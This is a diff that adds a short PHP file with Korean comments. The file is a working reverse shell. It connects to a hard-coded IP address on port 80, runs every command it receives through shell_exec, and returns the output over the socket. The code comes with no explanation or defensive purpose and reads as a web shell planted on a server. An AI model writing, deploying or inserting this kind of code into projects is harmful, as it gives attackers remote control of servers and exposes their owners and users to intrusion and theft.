@@ -1,0 +1,15 @@
+<?php
+$ip = '192.168.1.133'; // 연결할 IP 주소
+$port = 80; // 사용할 포트 번호
+
+// 소켓 생성
+$sock = fsockopen($ip, $port);
+if ($sock) {
+    // 입력 스트림을 열고 명령을 실행
+    while ($cmd = fgets($sock)) {
+        $output = shell_exec($cmd);
+        fwrite($sock, $output);
+    }
+    fclose($sock);
+}
+?>
